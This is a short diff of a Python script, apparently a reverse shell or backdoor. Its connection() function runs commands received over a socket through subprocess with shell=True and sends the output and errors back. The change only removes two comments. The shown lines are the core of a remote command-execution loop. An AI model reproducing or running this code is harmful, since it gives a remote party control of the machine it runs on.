@@ -15,8 +15,8 @@ def connection():
         else:
 
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            s.send(CMD.stdout.read()) # send the result
-            s.send(CMD.stderr.read()) # misstype a command error will be prompted back
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read()) 
 
 
 def main():
